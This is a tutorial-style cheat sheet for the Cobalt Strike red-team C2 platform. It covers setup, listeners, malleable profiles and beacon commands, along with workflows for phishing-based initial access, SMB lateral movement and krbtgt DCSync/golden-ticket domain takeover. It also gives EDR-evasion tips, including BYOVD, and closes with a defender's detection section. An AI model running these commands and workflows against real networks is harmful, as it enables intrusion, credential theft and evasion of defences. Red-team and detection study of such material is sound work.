# Cobalt Strike — full tutorial

Commercial adversary-emulation platform. The de-facto C2 of red teams 2017–present (and, unfortunately, ransomware crews who pirated it). Strengths: malleable C2 profiles, mature beacon, BOFs, team-server collab. Cost: ~$3.5k/user/year.

> [!info] Licensing
> Only purchase via Fortra (formerly HelpSystems). Pirated copies have backdoors and identifying watermarks. Pirated use against any production target = automatic legal exposure.

## Components

```
[ team server ]   ←── operator(s) → [ Aggressor client GUI ]
       │
       ▼
[ listeners (HTTPS / DNS / SMB pipe) ]
       │
       ▼
[ beacons on victims ]
```

## Setup

```terminal
# On a hardened Linux VPS (Tier-2 redirector should be in front)
./teamserver <external-ip> <password> profile.malleable
# Default port 50050; firewall to operator IPs only
```

Operator side:

```terminal
java -jar cobaltstrike.jar
# Connect: host=team-server-ip, port=50050, user=op1, password=<above>
```

## Listeners

| Type | Use |
|------|-----|
| `windows/beacon_https/reverse_https` | Most-used; via redirector |
| `windows/beacon_http/reverse_http` | Lab / unencrypted |
| `windows/beacon_dns/reverse_dns_txt` | Slow but bypasses many WAFs |
| `windows/beacon_bind_pipe` | SMB pipe peer-to-peer (lateral, no callback) |
| `windows/beacon_bind_tcp` | TCP peer-to-peer |
| `windows/foreign/reverse_https` | Hand off to MSF / Sliver |

## Malleable C2 profiles

A `.profile` file shapes every byte of beacon traffic — URI, headers, cookies, TLS, request/response framing — to mimic legitimate apps.

Reference public profile sets: `threatexpress/malleable-c2`, `rsmudge/Malleable-C2-Profiles`. Always lint with `c2lint profile.malleable` before launch.

```c
http-get "/v1/me/messages" {
    client {
        header "User-Agent" "Microsoft Office/16.0";
        metadata { netbios; base64url; uri-append; }
    }
    server {
        header "Content-Type" "application/json";
        output { netbiosu; print; }
    }
}
sleeptime 60000;
jitter 35;
```

## Beacon — operator commands

| Command | Effect |
|---------|--------|
| `help` / `help <cmd>` | Built-in help |
| `sleep 30 25` | Beacon every 30s ±25% jitter |
| `shell whoami` | Run cmd.exe |
| `powershell ...` / `powerpick` | PS via .NET (powerpick = no PS detection) |
| `pwd / cd / ls` | FS navigation |
| `download / upload` | File transfer |
| `screenshot / keylogger` | Surveillance |
| `inline-execute / execute-assembly` | Run BOF / .NET in-memory |
| `mimikatz` | Built-in Mimikatz BOF |
| `hashdump / dcsync` | Credential harvest |
| `getsystem / getuid` | Token / SYSTEM |
| `make_token / steal_token` | Token impersonation |
| `pth / kerberos_ticket_use` | PtH / PtT |
| `socks 1080` | SOCKS proxy via beacon |
| `rportfwd 4444 ...` | Reverse port forward |
| `psexec / psexec_psh / wmi / dcom` | Lateral movement |
| `link \\HOST\pipe\name` | Connect SMB-pipe beacon (peer to peer) |
| `spawnto x64 c:\windows\sysnative\rundll32.exe` | Set process for forking |
| `spawn windows/beacon_https/...` | Spawn another beacon in given listener |
| `inject <pid> windows/beacon_https/...` | Inject into existing process |

## BOFs (Beacon Object Files)

In-memory C compiled to BOF format, run inside beacon — no new process. Examples:

- `inline-execute /opt/bofs/seatbelt.x64.o -group=remote`
- `inline-execute /opt/bofs/sharphound.x64.o`
- `inline-execute /opt/bofs/whoami.x64.o`

Library: `trustedsec/CS-Situational-Awareness-BOF`.

## Aggressor scripts

`.cna` scripts extend the GUI and beacon: custom commands, hotkeys, automation. Used for engagement-specific automation.

## Workflows

### Initial access via HTTPS stager

1. Generate stager: `Attacks → Web Drive-by → Scripted Web Delivery (S)` → choose `powershell` → "PS one-liner" copied to clipboard.
2. Phish the user to run it. Beacon checks in.

### Pivot lateral via SMB-pipe

```
beacon> spawn windows/beacon_bind_pipe
beacon> psexec_psh DC01 windows/beacon_bind_pipe
# DC01's beacon connects via SMB pipe through the first beacon — no new outbound to internet
```

### Domain dominance

```
beacon> mimikatz lsadump::dcsync /user:krbtgt
beacon> kerberos_ticket_use golden.kirbi
beacon> elevate svc-exe DC01 windows/beacon_bind_pipe
```

## Bad output and fixes

| Symptom | Cause | Fix |
|---------|-------|-----|
| Beacon dies after seconds | EDR injection signature | Use process forking (spawnto), modern C2 profile |
| `[-] could not connect to handler` | Listener / redirector misconfigured | Check redirector logs; verify SNI on Cloudflare |
| Mimikatz BOF returns garbage | LSA Protected Process Light (RunAsPPL) | Drop unsigned-driver-killer (BYOVD) or use offline approach |
| Beacon is fingerprintable | Default profile | Use a custom malleable profile + custom shellcode |

## Defender's perspective

CS is **the most-fingerprinted C2 in existence**:

- Default beacon shellcode has stable signatures (sleep mask, configuration block).
- Default JA3/JA3S of plain HTTPS listener is well-known.
- Default URIs (`/__utm.gif`, `/ca`, `/ga`) without a profile.
- Sleep-mask anomalies in memory (sectional XOR pattern).
- BeaconHunter, BeaconEye, CS extractor tools dump beacon configuration from memory.

Detection wins:
- YARA rules on default sleep mask.
- Suricata: well-known TLS JA3 fingerprints unless profile rewrites them.
- DFIR-Report style: any process spawning `rundll32.exe` with no args, holding `lsass` handle, with TCP to a recently-registered domain.

## OPSEC

- **Always** run with a malleable profile + custom sleep mask + Artifact Kit modifications. Default Cobalt is detected in 5 minutes by any modern EDR.
- Burn license slots / certs per engagement. The author-watermark in the binary is recoverable post-incident.
- Tier-2 redirectors mandatory; never let beacons hit the team server directly.
- Stop using CS where the operator's life depends on stealth — switch to Sliver / Mythic / Brute Ratel for less-signatured options.

## Related tools

| Tool | Difference |
|------|-----------|
| **Sliver** | OSS, written in Go, multi-protocol, malleable, modern |
| **Mythic** | OSS C2 framework with swappable agents |
| **Brute Ratel C4** | Commercial, less-signatured, single-vendor support |
| **Havoc** | OSS, modern, designed against current EDR |
| **Empire** | OSS PowerShell C2 (mostly historical) |
| **Metasploit + meterpreter** | OSS, ubiquitous, more signatured |
